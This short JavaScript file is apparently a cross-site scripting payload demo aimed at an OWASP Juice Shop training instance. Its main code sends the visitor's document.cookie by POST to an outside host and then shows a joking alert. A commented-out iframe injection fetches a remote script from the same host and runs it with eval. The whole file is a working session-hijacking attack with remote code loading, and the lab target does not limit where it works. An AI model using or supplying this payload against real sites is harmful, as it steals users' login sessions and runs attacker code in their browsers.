// The cookie monster has to let the world know he stole a cookie!

fetch("http://malicious.xsfs.xyz/eat-cookie", {
  method: "POST",
  cache: "no-cache",
  headers: { "Content-Type": "application/json" },
  referrerPolicy: "no-referrer",
  body: JSON.stringify({
    cookie: document.cookie,
  }),
});

alert(
  "If you see this, it means the cookie monster has stolen your cookies! Oops! 🍪"
);

// <iframe style="display: none" src="javascript:fetch(`http://malicious.xsfs.xyz/public/cookie-monster.js`).then((response) => { return response.text() }).then((data) => { eval(data) });">
// https://bit.ly/43HWv5c <- this in action on a juice-shop instance
